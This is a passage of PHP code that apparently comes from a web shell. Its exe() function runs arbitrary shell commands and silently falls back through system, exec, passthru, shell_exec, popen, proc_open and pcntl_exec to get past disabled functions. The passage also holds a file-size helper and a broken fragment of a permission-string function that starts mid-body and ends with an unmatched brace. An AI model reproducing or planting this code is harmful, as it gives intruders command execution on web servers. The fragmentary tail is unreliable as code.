function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff .= $result;
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    } elseif (function_exists('popen')) {
        $handle = @popen($cmd, 'r');
        $buff = "";
        if (is_resource($handle)) {
            while (!feof($handle)) {
                $buff .= fread($handle, 1024);
            }
            pclose($handle);
        }
        return $buff;
    } elseif (function_exists('proc_open')) {
        $descriptors = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($cmd, $descriptors, $pipes);
        $buff = "";
        if (is_resource($process)) {
            $buff .= stream_get_contents($pipes[1]);
            $buff .= stream_get_contents($pipes[2]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        return $buff;
    } elseif (function_exists('pcntl_exec')) {
        @pcntl_exec('/bin/sh', ['-c', $cmd]);
        // This will not return as pcntl_exec replaces the current process.
    }
    return null;
}
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}

$info .= (($perms & 0x0004) ? 'r' : '-');

$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
